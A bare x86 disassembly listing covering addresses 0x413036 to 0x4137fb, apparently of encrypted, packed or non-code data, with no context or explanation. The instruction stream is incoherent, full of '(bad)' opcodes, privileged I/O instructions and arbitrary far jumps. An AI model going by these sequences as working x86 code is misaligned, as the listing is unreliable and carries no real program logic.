  413036:	jl     0x412fdf
  413038:	jns    0x4130b7
  41303a:	add    edx,ebp
  41303c:	mov    ebp,0x120c848f
  413041:	dec    ebp
  413042:	popa   
  413043:	or     al,0xa8
  413045:	xor    eax,0x65eae3da
  41304a:	call   FWORD PTR [ecx-0x6cf686a0]
  413050:	into   
  413051:	lahf   
  413052:	lock or dh,BYTE PTR [edi-0x692379cd]
  413059:	xor    esp,DWORD PTR [esi]
  41305b:	sub    BYTE PTR [edx*4+0x395bda65],ch
  413062:	inc    esp
  413063:	lds    esp,FWORD PTR [edx+0x495fa265]
  413069:	inc    ecx
  41306a:	stc    
  41306b:	inc    ebx
  41306c:	xchg   edi,eax
  41306d:	nop
  41306e:	sbb    DWORD PTR [ebp+0x56801b16],0x25c739df
  413078:	cmc    
  413079:	xchg   edi,eax
  41307a:	or     al,0x66
  41307c:	jp     0x413094
  41307e:	(bad)  
  41307f:	dec    esi
  413080:	pop    ebp
  413081:	(bad)  
  413082:	and    eax,0x8254dcb
  413087:	icebp  
  413088:	mov    ss,WORD PTR [edx-0x77]
  41308b:	fsubrp st(6),st
  41308d:	xor    BYTE PTR ds:0xd2dae6b2,bl
  413093:	xor    cl,BYTE PTR [esi+0x58]
  413096:	mov    edi,0xef175b2f
  41309b:	cmp    DWORD PTR [esi-0x46c2256e],0xffffffc3
  4130a2:	loopne 0x41306e
  4130a4:	sbb    al,0x23
  4130a6:	xor    BYTE PTR [edx],al
  4130a8:	jo     0x4130f6
  4130aa:	imul   eax,DWORD PTR [ebx-0x67],0x2f106055
  4130b1:	push   ebx
  4130b2:	in     eax,0x91
  4130b4:	call   FWORD PTR [esi+0x3]
  4130b7:	pop    ss
  4130b8:	pop    es
  4130b9:	fld    TBYTE PTR [edi]
  4130bb:	sbb    bl,BYTE PTR [esi]
  4130bd:	mov    dh,0xf3
  4130bf:	aas    
  4130c0:	pop    ecx
  4130c1:	xchg   esp,eax
  4130c2:	or     DWORD PTR [edi+edi*8-0x75],0x1c
  4130c7:	jno    0x4130d8
  4130c9:	push   edx
  4130ca:	mov    al,ds:0xf645ffbd
  4130cf:	xchg   esp,eax
  4130d0:	not    BYTE PTR [ecx]
  4130d2:	fisttp WORD PTR [esi-0xeb2c1b9]
  4130d8:	mov    eax,0xf9d5473d
  4130dd:	pusha  
  4130de:	imul   ecx,edx,0xdd73165f
  4130e4:	enter  0x5e13,0x34
  4130e8:	test   BYTE PTR [esi+ecx*2+0x17],0xc3
  4130ed:	sub    DWORD PTR [edi],edi
  4130ef:	les    edx,FWORD PTR [edx+0x4a]
  4130f2:	sbb    ch,0xd5
  4130f5:	stos   BYTE PTR es:[edi],al
  4130f6:	(bad)  
  4130f7:	ja     0x4130ef
  4130f9:	inc    eax
  4130fa:	rcl    dh,0x3
  4130fd:	imul   esp,DWORD PTR [edx],0xfffffffe
  413100:	aas    
  413101:	ret    
  413102:	lock inc esi
  413104:	jmp    0x4130b3
  413106:	in     al,dx
  413107:	aam    0x23
  413109:	adc    BYTE PTR [eax+edi*1],cl
  41310c:	cmp    eax,esp
  41310e:	popa   
  41310f:	xchg   esp,eax
  413110:	mov    ecx,0x6d237e1b
  413115:	jl     0x413110
  413117:	mov    edx,0x6066bddf
  41311c:	jb     0x413171
  41311e:	cmp    ecx,esi
  413120:	call   0xf01:0x2f955da9
  413127:	mov    ch,0xac
  413129:	bnd je 0x41315c
  41312c:	bound  edi,QWORD PTR [edx+eiz*1-0x4c]
  413130:	and    edi,DWORD PTR [esi]
  413132:	aam    0x36
  413134:	xor    bh,BYTE PTR [edx-0x4b]
  413137:	mov    cl,0x57
  413139:	xchg   esp,eax
  41313a:	adc    eax,0xe6f479a9
  41313f:	les    esi,FWORD PTR [ebx+0x35729e1f]
  413145:	test   bh,bl
  413147:	mov    bl,0x16
  413149:	xor    esi,DWORD PTR [edi+0x18]
  41314c:	and    dh,BYTE PTR [ebx]
  41314e:	arpl   WORD PTR [ecx+0x5c],si
  413151:	inc    ebp
  413152:	in     eax,dx
  413153:	inc    edi
  413154:	std    
  413155:	ud1    esp,DWORD PTR [edi]
  413158:	idiv   DWORD PTR [ebx+0x33]
  41315b:	cwde   
  41315c:	push   0x40
  41315e:	(bad)  
  41315f:	adc    DWORD PTR [edx],ebx
  413161:	neg    DWORD PTR [esi-0x1aa4ac8b]
  413167:	aaa    
  413168:	mov    esi,0x73ac9865
  41316d:	pop    edx
  41316e:	imul   eax,DWORD PTR [edx+0x38],0x86b608f4
  413175:	ror    BYTE PTR ds:0x4ce28b8d,0xc7
  41317c:	dec    ecx
  41317d:	mov    ?,WORD PTR [ebp+0x34f88fe]
  413183:	stc    
  413184:	aam    0x89
  413186:	imul   edi,edi,0x6c
  413189:	push   es
  41318a:	and    al,0x61
  41318c:	and    ch,dl
  41318e:	add    eax,0x3d5bac61
  413193:	cmp    BYTE PTR [eax],0xbc
  413196:	inc    esi
  413197:	iret   
  413198:	jnp    0x41318d
  41319a:	mov    DWORD PTR [esi],edx
  41319c:	xchg   esi,eax
  41319d:	mov    ?,WORD PTR [edx-0x72b91408]
  4131a3:	aas    
  4131a4:	es cmp eax,edi
  4131a7:	and    DWORD PTR [eax],esi
  4131a9:	mov    ah,0xc0
  4131ab:	adc    BYTE PTR [edi-0x751d72b4],dl
  4131b1:	lods   al,BYTE PTR ds:[esi]
  4131b2:	ret    0xcc84
  4131b5:	xor    bl,cl
  4131b7:	loop   0x4131e3
  4131b9:	ja     0x4131e0
  4131bb:	mov    ds:0x9bce4323,eax
  4131c0:	fs xor al,0x27
  4131c3:	jg     0x413179
  4131c5:	mov    al,ds:0x44aa7d5e
  4131ca:	(bad)  
  4131cb:	jecxz  0x41316c
  4131cd:	into   
  4131ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4131cf:	cli    
  4131d0:	inc    ebp
  4131d1:	mov    ebx,0x8a242d44
  4131d6:	aaa    
  4131d7:	mov    ch,0xb8
  4131d9:	pandn  mm6,mm6
  4131dc:	and    eax,0x172f7a8d
  4131e1:	jl     0x413250
  4131e3:	sbb    BYTE PTR [ecx+0x1],al
  4131e6:	fprem1 
  4131e8:	xor    eax,0x48128ea7
  4131ed:	mov    ch,BYTE PTR [ecx-0x49]
  4131f0:	(bad)
  4131f4:	push   eax
  4131f5:	inc    ecx
  4131f6:	inc    ebx
  4131f7:	pop    ds
  4131f8:	and    eax,0xb059a504
  4131fd:	sbb    BYTE PTR [esi-0x67],cl
  413200:	icebp  
  413201:	mov    BYTE PTR [edx-0xac6ce30],dl
  413207:	jecxz  0x413259
  413209:	ret    0xcd5c
  41320c:	dec    esp
  41320d:	sbb    al,0xee
  41320f:	jbe    0x41321b
  413211:	mov    ecx,0x4034f1a9
  413216:	pop    ebp
  413217:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413218:	arpl   WORD PTR [eax+eiz*8],dx
  41321b:	stos   DWORD PTR es:[edi],eax
  41321c:	cmc    
  41321d:	enter  0x909c,0xeb
  413221:	cmp    edi,DWORD PTR [ecx+0x41]
  413224:	cmp    cl,BYTE PTR [edi+0x484bd42]
  41322a:	cmp    DWORD PTR [ebx-0x6667cb21],esi
  413230:	ss inc ecx
  413232:	arpl   WORD PTR [eax-0x32],dx
  413235:	ja     0x41328a
  413237:	push   ebp
  413238:	mov    eax,0x8eda0729
  41323d:	add    ebp,ebp
  41323f:	jmp    0x5176:0xb62eedef
  413246:	out    0x4b,al
  413248:	jnp    0x41328d
  41324a:	mov    esp,ecx
  41324c:	pop    esi
  41324d:	mov    al,0x7a
  41324f:	xchg   edi,eax
  413250:	or     al,0xfa
  413252:	pop    edx
  413253:	mov    WORD PTR [ecx-0x2214e1b2],?
  413259:	and    cl,ch
  41325b:	stos   DWORD PTR es:[edi],eax
  41325c:	neg    BYTE PTR [edx]
  41325e:	xchg   BYTE PTR [eax],ch
  413260:	mov    ch,0x33
  413262:	neg    ebx
  413264:	fiadd  DWORD PTR [edi+0x1e]
  413267:	bound  ebp,QWORD PTR [esi-0x70]
  41326a:	cdq    
  41326b:	test   BYTE PTR [edx],bh
  41326d:	cdq    
  41326e:	fs scas al,BYTE PTR es:[edi]
  413270:	std    
  413271:	fiadd  DWORD PTR [eax-0x58]
  413274:	(bad)  
  413275:	jnp    0x413224
  413277:	popf   
  413278:	adc    ebp,DWORD PTR [edx+ebx*8+0x1f62b6f]
  41327f:	mov    ecx,0x38dd94f
  413284:	pop    esi
  413285:	loop   0x413244
  413287:	sbb    ch,BYTE PTR [ebx]
  413289:	jne    0x413275
  41328b:	punpckhbw mm3,mm7
  41328e:	div    DWORD PTR [ecx+edi*4+0x46]
  413292:	inc    esi
  413293:	stos   BYTE PTR es:[edi],al
  413294:	mov    bl,BYTE PTR [ebx-0x3e6c83d4]
  41329a:	jnp    0x41324c
  41329c:	or     al,0xe0
  41329e:	sbb    BYTE PTR [ebp+0x1e7a9b23],ah
  4132a4:	xorps  xmm6,xmm0
  4132a7:	call   0x5f9b6be2
  4132ac:	pop    edx
  4132ad:	xchg   ebx,eax
  4132ae:	in     eax,0xc1
  4132b0:	data16 mov WORD PTR [esi],?
  4132b3:	imul   ebx,DWORD PTR [edx],0x878253bb
  4132b9:	inc    esi
  4132ba:	xor    eax,DWORD PTR ds:0x78930406
  4132c0:	(bad)  
  4132c1:	pop    esp
  4132c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4132c3:	push   eax
  4132c4:	aaa    
  4132c5:	inc    edi
  4132c6:	or     eax,0x5b86f8fa
  4132cb:	stc    
  4132cc:	(bad)  
  4132cd:	xor    edi,DWORD PTR [esi+ebp*8]
  4132d0:	or     al,0x2c
  4132d2:	xchg   esi,eax
  4132d3:	pop    ss
  4132d4:	xchg   edi,eax
  4132d5:	pop    ds
  4132d6:	jbe    0x4132eb
  4132d8:	daa    
  4132d9:	shl    bl,cl
  4132db:	xor    ecx,DWORD PTR [eax+0x3f]
  4132de:	fwait
  4132df:	add    BYTE PTR [ebx],ah
  4132e1:	inc    ecx
  4132e2:	lods   al,BYTE PTR ds:[esi]
  4132e3:	pop    edi
  4132e4:	das    
  4132e5:	pop    ebp
  4132e6:	leave  
  4132e7:	arpl   WORD PTR [ebp-0x21fbafd4],ax
  4132ed:	ret    0x8f15
  4132f0:	adc    bl,BYTE PTR ds:0xa34e75cd
  4132f6:	dec    edx
  4132f7:	lds    ecx,FWORD PTR [edi+0x53]
  4132fa:	inc    DWORD PTR [edx-0x6f]
  4132fd:	jb     0x413306
  4132ff:	scas   eax,DWORD PTR es:[edi]
  413300:	dec    ecx
  413301:	mov    cl,0x0
  413303:	lahf   
  413304:	fwait
  413305:	out    dx,eax
  413306:	daa    
  413307:	sub    BYTE PTR [ebx+0x67],0x2d
  41330b:	hlt    
  41330c:	and    BYTE PTR [esi],al
  41330e:	xchg   si,ax
  413310:	pop    esp
  413311:	or     al,0x56
  413313:	jnp    0x413307
  413315:	fadd   QWORD PTR [edx+0x9ca3587]
  41331b:	nop
  41331c:	dec    eax
  41331d:	mov    DWORD PTR [edx],edi
  41331f:	jmp    0x6c42:0x29fcd750
  413326:	and    DWORD PTR ds:0x4e6c578e,ebx
  41332c:	shl    edx,cl
  41332e:	push   esi
  41332f:	cdq    
  413330:	ins    DWORD PTR es:[edi],dx
  413331:	shl    ebx,0x8b
  413334:	push   ds
  413335:	js     0x4133b3
  413337:	jl     0x4132ba
  413339:	(bad)  
  41333a:	outs   dx,BYTE PTR ds:[esi]
  41333b:	inc    esp
  41333c:	mov    eax,ds:0x7b653775
  413341:	mov    DWORD PTR [edx+edi*8],ebx
  413344:	inc    esp
  413345:	dec    esi
  413346:	adc    eax,ebx
  413348:	xor    BYTE PTR [ebp+0x46],cl
  41334b:	cmp    bl,dh
  41334d:	jmp    0xfc8d:0x75fad97b
  413354:	fisub  WORD PTR [ebx+0xa]
  413357:	dec    DWORD PTR [edx]
  413359:	jg     0x413318
  41335b:	xchg   edx,eax
  41335c:	les    edx,FWORD PTR [esi]
  41335e:	push   edi
  41335f:	fs add eax,0x2cc5e855
  413365:	fs icebp 
  413367:	ret    
  413368:	push   ss
  413369:	xchg   ebx,eax
  41336a:	out    0x49,al
  41336c:	and    eax,0x88a89a32
  413371:	mov    bh,0xea
  413373:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413374:	test   al,0x27
  413376:	push   ecx
  413377:	pop    edx
  413378:	int    0xf7
  41337a:	pop    edx
  41337b:	mov    ch,0xda
  41337d:	mov    ss,ebx
  41337f:	sub    DWORD PTR [edi],ebx
  413381:	cwde   
  413382:	pop    edx
  413383:	in     al,dx
  413384:	push   eax
  413385:	mov    ebp,0x31ce2155
  41338a:	jbe    0x413375
  41338c:	stos   DWORD PTR es:[edi],eax
  41338d:	in     al,0xa
  41338f:	xchg   esi,eax
  413390:	and    dh,cl
  413392:	stos   DWORD PTR es:[edi],eax
  413393:	or     eax,0x1bffd6f4
  413398:	push   edx
  413399:	pop    ebp
  41339a:	push   eax
  41339b:	out    0x7,eax
  41339d:	sti    
  41339e:	repz (bad)
  4133a1:	lock pop ebp
  4133a3:	lahf   
  4133a4:	xor    al,0x44
  4133a6:	icebp  
  4133a7:	nop
  4133a8:	(bad)  [eax-0x36fd68f8]
  4133ae:	lea    ecx,ds:[ebx-0x2a77a4e3]
  4133b5:	push   ebp
  4133b6:	cmp    edi,0x5
  4133b9:	outs   dx,DWORD PTR ds:[esi]
  4133ba:	call   0x2a62:0xcd2b0fd7
  4133c1:	adc    cl,BYTE PTR [ebx+ebp*1-0x30]
  4133c5:	pop    ebx
  4133c6:	hlt    
  4133c7:	std    
  4133c8:	xchg   esp,eax
  4133c9:	or     DWORD PTR [eax],edx
  4133cb:	in     eax,dx
  4133cc:	mov    ebx,0x49580810
  4133d1:	push   cs
  4133d2:	push   es
  4133d3:	cmp    DWORD PTR [ecx],eax
  4133d5:	or     eax,DWORD PTR [eax-0x3d]
  4133d8:	rcr    ebp,1
  4133da:	sub    ebx,esi
  4133dc:	mov    eax,0x8d9e33ef
  4133e1:	ds pushf 
  4133e3:	scas   eax,DWORD PTR es:[edi]
  4133e4:	lds    eax,FWORD PTR gs:[ecx]
  4133e7:	pop    esi
  4133e8:	or     dl,BYTE PTR [edx]
  4133ea:	stc    
  4133eb:	retf   0x50ad
  4133ee:	mov    ebp,edx
  4133f0:	iret   
  4133f1:	inc    edx
  4133f2:	dec    edi
  4133f3:	(bad)  
  4133f4:	xor    BYTE PTR [esi-0x1a5fb8b0],bh
  4133fa:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4133fc:	lock xchg ebp,eax
  4133fe:	lods   al,BYTE PTR ds:[esi]
  4133ff:	mov    edi,0xd6809a00
  413404:	or     eax,0x66670b44
  413409:	jecxz  0x4133b9
  41340b:	xchg   esp,eax
  41340c:	aam    0xb6
  41340e:	not    DWORD PTR [eax]
  413410:	cli    
  413411:	mov    dh,0xf8
  413413:	inc    esi
  413414:	mov    WORD PTR [edx-0x1c],ss
  413417:	ss sub ah,dl
  41341a:	repz jle 0x4133ba
  41341d:	ds jmp 0xeef:0x978eec22
  413425:	pop    eax
  413426:	pop    ss
  413427:	add    edx,ebp
  413429:	xor    BYTE PTR ds:0xc26619c,bl
  41342f:	sbb    al,0x75
  413431:	ss imul esi,esp,0xd2e42a32
  413438:	or     edx,DWORD PTR [ecx+0x39]
  41343b:	cld    
  41343c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41343d:	sbb    dl,BYTE PTR [edx]
  41343f:	mov    esi,cs
  413441:	mov    dl,0xa4
  413443:	pop    ecx
  413444:	add    DWORD PTR [edx+0x450d2b9e],ecx
  41344a:	out    dx,eax
  41344b:	jbe    0x41343f
  41344d:	xor    BYTE PTR ds:0x6eba3275,0xa9
  413454:	test   BYTE PTR [eax+0x30],bl
  413457:	js     0x4133f1
  413459:	popa   
  41345a:	push   0x6f
  41345c:	add    esi,DWORD PTR [esi+0x8cd471b]
  413462:	(bad)  
  413463:	out    dx,eax
  413464:	ja     0x41340c
  413466:	leave  
  413467:	enter  0x68fb,0xe5
  41346b:	xor    al,0x1e
  41346d:	xor    bh,bh
  41346f:	into   
  413470:	dec    eax
  413471:	xchg   esp,eax
  413472:	fdivr  QWORD PTR [ebp+0x5bba4b40]
  413478:	xchg   edi,eax
  413479:	jnp    0x4134bb
  41347b:	or     BYTE PTR [ecx+0x2f],bh
  41347e:	imul   edi,esi,0x93cc7dcf
  413484:	jne    0x413472
  413486:	push   ebx
  413487:	pusha  
  413488:	aas    
  413489:	ins    DWORD PTR es:[edi],dx
  41348a:	cmp    al,0x77
  41348c:	inc    eax
  41348d:	and    al,0x88
  41348f:	mov    eax,0xa50722ed
  413494:	dec    esp
  413495:	inc    esp
  413496:	jp     0x41341e
  413498:	aaa    
  413499:	fbstp  TBYTE PTR [ebp+ebp*2-0x66cbe917]
  4134a0:	icebp  
  4134a1:	repz shl edi,cl
  4134a4:	add    eax,0x34214dca
  4134a9:	adc    BYTE PTR [eax-0x455e752c],ch
  4134af:	mov    ebx,ecx
  4134b1:	xchg   BYTE PTR [esp+edi*8],ch
  4134b4:	shl    DWORD PTR [edx-0x20],0x5e
  4134b8:	jns    0x413504
  4134ba:	dec    esi
  4134bb:	sbb    DWORD PTR [ebx-0x4e],esi
  4134be:	push   ds
  4134bf:	dec    edx
  4134c0:	out    dx,al
  4134c1:	jb     0x413458
  4134c3:	aam    0x20
  4134c5:	into   
  4134c6:	sub    eax,0xa94c7601
  4134cb:	aad    0x4b
  4134cd:	pop    esi
  4134ce:	(bad)  
  4134cf:	push   ebx
  4134d0:	adc    ebx,0x12
  4134d3:	push   edx
  4134d4:	mov    cl,0xeb
  4134d6:	scas   al,BYTE PTR es:[edi]
  4134d7:	fadd   DWORD PTR [eax]
  4134d9:	clc    
  4134da:	push   ebx
  4134db:	or     eax,0xa528a397
  4134e0:	dec    ebp
  4134e1:	pop    ebx
  4134e2:	leave  
  4134e3:	sub    edx,DWORD PTR [ebx-0x12e8eade]
  4134e9:	in     al,dx
  4134ea:	inc    esp
  4134eb:	fcomp  QWORD PTR [edi]
  4134ed:	mov    ah,0x1b
  4134ef:	xor    ecx,esp
  4134f1:	popa   
  4134f2:	mov    ch,0x27
  4134f4:	push   esp
  4134f6:	jb     0x413492
  4134f8:	add    ch,al
  4134fa:	icebp  
  4134fb:	dec    esp
  4134fc:	loopne 0x4134f1
  4134fe:	xchg   dh,dh
  413500:	cmp    DWORD PTR [esi],ebp
  413502:	push   ss
  413503:	cmp    al,0xd4
  413505:	call   0xfab1:0x7078686b
  41350c:	push   ebx
  41350d:	mov    ds:0x346b8343,al
  413512:	js     0x41349e
  413514:	mov    esp,0x2e8cc48d
  413519:	and    ebx,0x27
  41351c:	sar    eax,1
  41351e:	and    ecx,eax
  413520:	push   eax
  413521:	jmp    0x4134e7
  413523:	xor    al,0xcd
  413525:	scas   al,BYTE PTR es:[edi]
  413526:	cmp    al,0x4a
  413528:	std    
  413529:	mov    ch,0xd9
  41352b:	ds (bad) 
  41352d:	dec    esi
  41352e:	xchg   esp,eax
  41352f:	jmp    0x413563
  413531:	loope  0x413577
  413533:	in     al,0xc9
  413535:	adc    esp,DWORD PTR ds:0xeb316d29
  41353b:	mul    DWORD PTR [edi+ebx*1-0x31]
  41353f:	hlt    
  413540:	scas   al,BYTE PTR es:[edi]
  413541:	pop    edi
  413542:	mov    es,WORD PTR ds:0x96de097c
  413548:	pop    edx
  413549:	or     al,0xf3
  41354b:	icebp  
  41354c:	dec    esp
  41354d:	sbb    dh,ch
  41354f:	dec    ebx
  413550:	(bad)  
  413551:	repnz fst DWORD PTR [esp+edi*4+0x51b01b90]
  413559:	push   eax
  41355a:	test   BYTE PTR [edx-0x73],0xec
  41355e:	jmp    0x4135ba
  413560:	sub    dl,BYTE PTR [edx+0x577f7ad7]
  413566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413567:	and    al,0xf1
  413569:	push   esp
  41356a:	sub    DWORD PTR [esi],esp
  41356c:	cmp    DWORD PTR [eax],eax
  41356e:	not    DWORD PTR [ebx+esi*8-0x5456783f]
  413575:	in     eax,0xc7
  413577:	leave  
  413578:	mov    bh,0xef
  41357a:	je     0x413565
  41357c:	mov    esp,0x83f2d775
  413581:	pop    ds
  413582:	js     0x413566
  413584:	adc    edi,ecx
  413586:	adc    ebp,ecx
  413588:	test   BYTE PTR [eax],cl
  41358a:	mov    edi,0x8eceab9
  41358f:	dec    esp
  413590:	push   esi
  413591:	cmp    eax,0x3d4e99f5
  413596:	jecxz  0x413576
  413598:	out    dx,al
  413599:	fnstcw WORD PTR [eax+0x7f]
  41359c:	fcom   QWORD PTR [ecx]
  41359e:	inc    ecx
  41359f:	sub    al,0x92
  4135a1:	or     BYTE PTR [ebx],dl
  4135a3:	xor    esp,DWORD PTR [ecx+0x7eb8b64a]
  4135a9:	cmp    cl,BYTE PTR [edi+0x7c]
  4135ac:	(bad)  
  4135ad:	into   
  4135ae:	or     DWORD PTR [edi+eax*1+0x5cf4b112],ebp
  4135b5:	or     al,0x9a
  4135b7:	or     DWORD PTR [ebp+0x23f91967],esi
  4135bd:	pop    eax
  4135be:	mov    edi,0x86b7f977
  4135c3:	es mov dl,0xff
  4135c6:	add    DWORD PTR [ebp-0x76600096],esi
  4135cc:	sub    ecx,DWORD PTR [edi+0x65]
  4135cf:	sbb    BYTE PTR [eax+0x4d8fe6f7],dh
  4135d5:	mov    ds:0x6a52a8c6,al
  4135da:	sub    eax,0x2390b1d9
  4135df:	pop    esi
  4135e0:	pop    edx
  4135e1:	das    
  4135e2:	imul   esi,DWORD PTR ds:[esi],0x8c28ab7e
  4135e9:	dec    esi
  4135ea:	ins    BYTE PTR es:[edi],dx
  4135eb:	jp     0x4135e0
  4135ed:	jg     0x4135b1
  4135ef:	pop    es
  4135f0:	out    dx,al
  4135f1:	push   cs
  4135f2:	mov    ch,0x4
  4135f4:	mov    esp,DWORD PTR [ecx-0x2b5356bb]
  4135fa:	xor    al,0x2a
  4135fc:	jb     0x4135ef
  4135fe:	push   cs
  4135ff:	and    al,BYTE PTR [eax+0x616a43f7]
  413605:	std    
  413606:	mov    ah,0x10
  413608:	xor    BYTE PTR [eax+0x33f41334],ah
  41360e:	jae    0x41368f
  413610:	xchg   ebx,eax
  413611:	cmc    
  413612:	pop    esp
  413613:	hlt    
  413614:	adc    DWORD PTR [edi],0xc51b0a2
  41361a:	sub    BYTE PTR [edx-0x7ef48bfa],bh
  413620:	sub    al,BYTE PTR [ebx]
  413622:	mov    edi,0x7b12d62f
  413627:	out    dx,al
  413628:	sbb    al,0x62
  41362a:	push   0x85bb4b76
  41362f:	xlat   BYTE PTR ds:[ebx]
  413630:	jo     0x41368b
  413632:	sbb    al,0xa8
  413634:	jne    0x41364e
  413636:	stos   DWORD PTR es:[edi],eax
  413637:	xchg   ebp,eax
  413638:	test   DWORD PTR [edi+0x5945cbb],eax
  41363e:	mov    eax,0x2d690379
  413643:	inc    ebp
  413644:	mov    fs,WORD PTR [edx]
  413646:	jmp    0xe1945113
  41364b:	jb     0x413611
  41364d:	in     al,0xc9
  41364f:	lsl    edi,WORD PTR [ebx]
  413652:	aad    0x23
  413654:	or     bl,BYTE PTR [eax+0x3d28f7f0]
  41365a:	cs jmp 0x287e00bf
  413660:	je     0x41363d
  413662:	cmp    edx,esp
  413664:	sub    BYTE PTR [edx],ch
  413666:	js     0x413672
  413668:	cwde   
  413669:	mov    dl,0xf6
  41366b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41366c:	outs   dx,BYTE PTR ds:[esi]
  41366d:	xchg   esi,eax
  41366e:	cmp    ecx,DWORD PTR [edi]
  413670:	pop    eax
  413671:	mov    al,bl
  413673:	push   eax
  413674:	inc    ebx
  413675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413676:	jp     0x41367c
  413678:	xchg   edx,eax
  413679:	xor    eax,0xdb22e233
  41367e:	(bad)  
  413680:	xchg   BYTE PTR [edx],al
  413682:	out    dx,al
  413683:	push   eax
  413684:	lahf   
  413685:	fistp  DWORD PTR [esi-0x5c63f6ce]
  41368b:	leave  
  41368c:	push   edx
  41368d:	push   ss
  41368e:	sbb    DWORD PTR [eax],edi
  413690:	addr16 mov ah,0x2a
  413693:	jnp    0x4136ad
  413695:	test   al,0x1e
  413697:	mov    edx,0x9701b068
  41369c:	inc    eax
  41369d:	or     al,0xe9
  41369f:	enter  0x5ea0,0xeb
  4136a3:	out    0xea,eax
  4136a5:	pop    edi
  4136a6:	adc    eax,0xe648bc44
  4136ab:	and    eax,0xefa7ce98
  4136b0:	cmp    DWORD PTR [eax+0x48],edx
  4136b3:	mov    ds:0xd9d7ef1c,eax
  4136b8:	mov    cl,0x6c
  4136ba:	mov    dh,0x5
  4136bc:	xor    ebx,DWORD PTR [ebx+0x41]
  4136bf:	(bad)  
  4136c0:	repnz shr BYTE PTR [eax],cl
  4136c3:	jge    0x413673
  4136c5:	test   eax,0xf4372679
  4136ca:	mov    bh,0x55
  4136cc:	test   BYTE PTR [eax],bh
  4136ce:	stos   BYTE PTR es:[edi],al
  4136cf:	leave  
  4136d0:	call   0x343d:0x828cf697
  4136d7:	sbb    al,0x1f
  4136d9:	sub    BYTE PTR [ebp-0x410764bd],bl
  4136df:	dec    edx
  4136e0:	ins    DWORD PTR es:[edi],dx
  4136e1:	sub    al,0xad
  4136e3:	cmp    cl,BYTE PTR [edx-0x20912f33]
  4136e9:	mov    esi,0x61f1eec1
  4136ee:	imul   ecx,DWORD PTR [edi-0x448556c2],0xced9e54
  4136f8:	dec    esp
  4136f9:	repz sahf 
  4136fb:	xchg   edx,ebx
  4136fd:	jmp    0xc68f:0x1427722b
  413704:	retf   
  413705:	rcr    BYTE PTR [edi-0x3a654999],cl
  41370b:	mov    eax,0xa2c52751
  413710:	mov    ebp,0xdc38b961
  413715:	aam    0xa5
  413717:	mov    al,ds:0xeeadd4f5
  41371c:	aas    
  41371d:	outs   dx,BYTE PTR ds:[esi]
  41371e:	dec    esi
  41371f:	dec    edx
  413720:	lods   eax,DWORD PTR ds:[esi]
  413721:	jb     0x41373f
  413723:	pop    esi
  413724:	add    esp,DWORD PTR [ecx]
  413726:	ds mov ch,0xc
  413729:	inc    edi
  41372a:	popa   
  41372b:	into   
  41372c:	and    DWORD PTR [ebx],0x31
  41372f:	sub    al,0x4c
  413731:	sbb    DWORD PTR [eax],esp
  413733:	test   al,0xf6
  413735:	mov    BYTE PTR [esi+eiz*2],al
  413738:	shr    BYTE PTR [ebp+0xc],1
  41373b:	gs es pop ebp
  41373e:	pusha  
  41373f:	push   ebx
  413740:	inc    ecx
  413741:	out    0x62,al
  413743:	push   es
  413744:	add    BYTE PTR [ecx],dl
  413746:	xchg   ebx,eax
  413747:	or     esp,DWORD PTR [ebx+eax*4+0x12b0e1f6]
  41374e:	sbb    al,0xc4
  413750:	inc    edi
  413751:	adc    ah,BYTE PTR [edx+0x54]
  413754:	push   ebx
  413755:	sbb    cl,BYTE PTR [eax]
  413757:	cmp    esi,DWORD PTR [ebp-0x4b]
  41375a:	retf   0xa76d
  41375d:	xchg   ebx,eax
  41375e:	lods   al,BYTE PTR ds:[esi]
  41375f:	and    eax,0xc0b3665a
  413764:	and    DWORD PTR [eax],edi
  413766:	or     edx,eax
  413768:	inc    BYTE PTR [edx-0x1e]
  41376b:	push   ebx
  41376c:	test   eax,0x7b4c4b39
  413771:	stos   BYTE PTR es:[edi],al
  413772:	pop    es
  413773:	pop    ss
  413774:	pop    es
  413775:	outs   dx,BYTE PTR ds:[esi]
  413776:	loope  0x4137d8
  413778:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413779:	sbb    ecx,eax
  41377b:	add    ah,BYTE PTR [esi-0x69c27011]
  413781:	jb     0x413802
  413783:	dec    eax
  413784:	rcr    BYTE PTR [eax+0x7e],cl
  413787:	into   
  413788:	xor    eax,0xb68bd1a7
  41378d:	ficom  WORD PTR [ebp+0x3f]
  413790:	pavgw  mm1,QWORD PTR [ebx+edx*2]
  413794:	xor    al,0xc
  413796:	addr16 xchg ebx,eax
  413798:	scas   al,BYTE PTR es:[edi]
  413799:	dec    edx
  41379a:	loop   0x413742
  41379c:	outs   dx,BYTE PTR ds:[esi]
  41379d:	mov    edi,0xb76e9f8c
  4137a2:	adc    esp,DWORD PTR [ecx]
  4137a4:	pop    edi
  4137a5:	scas   eax,DWORD PTR es:[edi]
  4137a6:	dec    esp
  4137a7:	push   edi
  4137a8:	out    0xd9,eax
  4137aa:	push   ebp
  4137ab:	mov    al,0xec
  4137ad:	pop    ebp
  4137ae:	adc    ebp,eax
  4137b0:	push   0x1c
  4137b2:	fs jp  0x413833
  4137b5:	aam    0x93
  4137b7:	jno    0x413799
  4137b9:	call   0x13bf0510
  4137be:	std    
  4137bf:	out    dx,eax
  4137c0:	rol    DWORD PTR [edi],0x93
  4137c3:	not    DWORD PTR [ecx+0x3c79966]
  4137c9:	sti    
  4137ca:	sub    bl,BYTE PTR [eax-0x78d7fabd]
  4137d0:	dec    esi
  4137d1:	gs imul ebp,ebp,0xb
  4137d5:	xor    BYTE PTR [ebp-0x48],cl
  4137d8:	xchg   DWORD PTR [ebx+0x85d15e2],eax
  4137de:	call   0xeac0976b
  4137e3:	repnz push ss
  4137e5:	ret    0x539e
  4137e8:	mov    WORD PTR [ebx+0x6ed59501],cs
  4137ee:	or     BYTE PTR [edx+0x7],dl
  4137f1:	popa   
  4137f2:	mov    eax,es
  4137f4:	sbb    BYTE PTR [edx+edi*8-0x42],0x24
  4137f9:	loop   0x413792
  4137fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
